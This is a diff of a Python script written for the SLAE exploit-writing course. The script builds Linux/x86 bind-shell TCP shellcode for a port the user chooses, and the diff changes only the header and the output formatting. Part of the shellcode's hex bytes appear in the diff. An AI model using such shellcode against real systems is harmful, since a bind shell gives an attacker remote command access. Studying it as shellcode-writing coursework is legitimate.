@@ -1,5 +1,5 @@
-# SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86) Wrapper
-# Author:  Matteo Malvica (@MrTuxracer)
+# SLAE - Assignment #1: BindShell (Linux/x86) Wrapper
+# Author:  Matteo Malvica (@matteomalvica)
 # Website:  http://www.matteomalvica.com
  
 import sys
@@ -21,7 +21,7 @@ else:
     		sys.exit()		
         # convert integer argv port to hex and stuff with leading zeroes if port hex length is < 4
     	hexport = hex(port)[2:].zfill(4)
-    	print "Hex value of port: " + hexport
+    	print "\nPort hex value: \t\t" + hexport
         
         # split hexport in two parts to check for null byte
     	b1 = hexport[0:2]
@@ -43,7 +43,7 @@ else:
     
     	shellport=b1+b2
     
-    	print "\nShellcode-ready port: " + shellport
+    	print "\nShellcode-ready port:\t\t" + shellport
     
     	shellcode = bytearray("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6"+
     	"\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80"+
@@ -59,7 +59,7 @@ else:
     	"\\x80")
 
     	print "\nFinal shellcode:\n" + "\"" + shellcode + "\""
-        print "Shellocde length is: " + str(len(shellcode)/4)
+        print "\nShellocde length is:\t\t" + str(len(shellcode)/4) + "\n"
     except:
         print "Something went wrong - exiting..."
 
